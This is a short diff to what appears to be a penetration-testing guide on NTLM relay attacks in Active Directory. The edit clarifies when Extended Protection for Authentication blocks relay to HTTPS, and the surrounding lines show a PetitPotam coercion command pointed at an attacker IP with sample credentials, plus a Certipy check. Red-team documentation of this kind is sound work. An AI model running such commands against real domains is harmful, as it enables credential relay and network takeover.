@@ -289,7 +289,7 @@ python3 PetitPotam.py -u coward -p 'P@ssw0rd' -d kawakatz.local <attacker ip>@80
 
 ## NTLM Relay to HTTP/HTTPS
 #### Prerequisites
-HTTP is generally vulnerable to relay attacks. EPA (Extended Protection for Authentication) must not be required to perform the relay attack. [Certipy](https://github.com/ly4k/Certipy) can be used to check EPA settings. Although Certipy is a toolkit for ADCS, the logic of [the check_channel_binding function](https://github.com/ly4k/Certipy/blob/main/certipy/commands/find.py#L684) can also be applied to general HTTPS endpoints.
+HTTP is generally vulnerable to relay attacks. EPA (Extended Protection for Authentication) must not be required to perform the relay attack on HTTPS. [Certipy](https://github.com/ly4k/Certipy) can be used to check EPA settings. Although Certipy is a toolkit for ADCS, the logic of [the check_channel_binding function](https://github.com/ly4k/Certipy/blob/main/certipy/commands/find.py#L684) can also be applied to general HTTPS endpoints.
 ```sh
 certipy find -u coward -p 'P@ssw0rd' -dc-ip <dc ip>
 ```
